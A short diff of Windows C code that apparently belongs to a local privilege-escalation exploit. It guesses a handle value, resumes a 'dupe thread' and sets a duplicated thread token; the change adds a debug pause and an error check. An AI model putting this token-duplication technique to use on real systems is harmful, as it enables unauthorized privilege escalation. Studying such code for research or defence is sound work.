@@ -57,7 +57,8 @@ int main() {
 	// it will bring shame upon my house.
 	HANDLE hTarget = FindNextCreatedHandle();
 	hTarget = (HANDLE)((UINT64)hTarget + 4);
-
+	puts("press key UwU");
+	getchar();
 	puts("Resuming dupe thread");
 	dwSuspendCount = ResumeThread(hDupeThread);
 	if (dwSuspendCount == -1) {
@@ -82,6 +83,10 @@ int main() {
 		else {
 			puts("Set the thread token!");
 		}
+	}
+	else {
+		printf("Failed to dupe token: %lx\n", GetLastError());
+		return -1;
 	}
 
 	getchar();
